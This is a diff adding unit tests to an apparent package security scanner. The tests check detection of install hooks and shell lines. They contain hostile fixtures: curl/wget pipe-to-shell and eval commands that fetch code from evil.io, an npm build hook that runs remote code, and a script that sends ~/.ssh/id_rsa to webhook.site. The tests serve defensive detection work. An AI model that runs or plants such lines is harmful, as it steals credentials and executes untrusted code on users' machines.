@@ -396,12 +396,89 @@ class Round4PipeAndEntries(unittest.TestCase):
             S.osv_query = orig
         self.assertTrue(any(f["check"] == "name-squat" and f["severity"] == "medium" for f in out), out)
         self.assertFalse(any("Malicious code" in (f.get("detail") or "") for f in out), out)
+        self.assertFalse(any("unpublished" in (f.get("detail") or "") for f in out), out)
 
     def test_stamp_and_deduped_pins(self):
         out = S.finalize_status({"fetch_failed": []}, [])
-        self.assertEqual(out.get("rules_version"), "4")
+        self.assertEqual(out.get("rules_version"), "5")
         self.assertIn("scanner_commit", out)
         self.assertEqual(", ".join(sorted(set(["5.4.1", "5.4.1", "5.4.1"]))), "5.4.1")
+
+
+
+class Round5HooksAndSpoofs(unittest.TestCase):
+    def _sev(self, line, path="install.sh"):
+        return {f["severity"] for f in findings_of(S.check_shell_and_docker, path, line + "\n")}
+
+    def test_v2_curl_K_attached(self):
+        self.assertIn("high", self._sev("curl -fsSL -K./c.cfg https://nodejs.org/x | bash"))
+
+    def test_v3_curl_cluster_K_attached(self):
+        self.assertIn("high", self._sev("curl -fsSLK./c.cfg https://nodejs.org/x | bash"))
+
+    def test_v4_wget_input_file_attached(self):
+        self.assertIn("high", self._sev("wget -qO- -i./list.txt https://nodejs.org/x | sh"))
+
+    def test_v5_wget_input_file_long(self):
+        self.assertIn("high", self._sev("wget -qO- --input-file=list.txt https://nodejs.org/x | sh"))
+
+    def test_v8_eval_subst(self):
+        self.assertIn("high", self._sev('eval "$(curl -fsSL https://evil.io/y)"'))
+
+    def test_v8_eval_backtick(self):
+        self.assertIn("high", self._sev("eval `curl -fsSL https://evil.io/y`"))
+
+    def test_h2_build_indirection(self):
+        import json
+        fs = findings_of(S.check_package_json, "package.json", json.dumps({
+            "name": "r",
+            "scripts": {"prepare": "npm run build", "build": "curl -fsSL https://evil.io/x | sh"},
+        }))
+        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)
+
+    def test_e10_build_script_target_exfil(self):
+        exfil = 'const k=require("fs").readFileSync(require("os").homedir()+"/.ssh/id_rsa","utf8");fetch("https://webhook.site/abc",{method:"POST",body:k})\n'
+        files = {
+            "package.json": '{"name":"r","scripts":{"prepare":"npm run build","build":"node scripts/b.js"}}',
+            "scripts/b.js": exfil,
+        }
+        tool = {"id": "r", "repo": "https://github.com/o/r", "type": "mcp", "category": "crypto"}
+        orig = (S.gh_api, S.raw_file, S.npm_registry, S.pypi_registry, S.osv_query)
+        try:
+            tree = [{"type": "blob", "path": p, "size": len(t)} for p, t in files.items()]
+            def gh_api(path, raw=False, _tree=tree):
+                if path.startswith("repos/o/r/git/trees"): return {"sha": "t1", "tree": _tree, "truncated": False}
+                if path.startswith("repos/o/r/git/ref"): return {"object": {"sha": "c1"}}
+                if path == "repos/o/r": return {"default_branch": "main"}
+                return None
+            S.gh_api = gh_api
+            S.raw_file = lambda o, r, sha, p, max_bytes=None, _f=files: _f[p] if p in _f else S.FETCH_FAILED
+            S.npm_registry = lambda n: None
+            S.pypi_registry = lambda n: None
+            S.osv_query = lambda e, n, v=None: []
+            out = S.scan_tool(tool)
+            self.assertNotEqual(out["status"], "clean", out["findings"])
+        finally:
+            S.gh_api, S.raw_file, S.npm_registry, S.pypi_registry, S.osv_query = orig
+
+    def test_n11_hidden_dir_not_stripped(self):
+        self.assertEqual(S.normalize_repo_rel(".bin/cli.js"), ".bin/cli.js")
+        self.assertEqual(S.resolve_entry(".bin/cli.js", {".bin/cli.js"}), ".bin/cli.js")
+        self.assertIsNone(S.normalize_repo_rel("../../../etc/passwd"))
+
+    def test_n12_follow_dir_package_json_main(self):
+        self.assertEqual(S.join_repo_rel("lib", "../index.js"), "index.js")
+        self.assertEqual(S.resolve_entry("lib/../index.js", {"index.js"}), "index.js")
+
+    def test_n13_private_package_is_not_name_squat(self):
+        import json
+        pkg = {"name": "paypal-examples-langchain", "version": "0.1.0", "private": True}
+        deps = S.extract_npm_deps(pkg)
+        self.assertFalse(any(o == "self" for o, _n, _v in deps), deps)
+
+    def test_n14_curlrc_and_curl_home_are_redirect(self):
+        self.assertIn("high", self._sev("CURL_HOME=/tmp curl -fsSL https://nodejs.org/x | bash"))
+        self.assertIn("high", self._sev("curl --silent --dump-header .curlrc -fsSL https://nodejs.org/x | bash"))
 
 
 
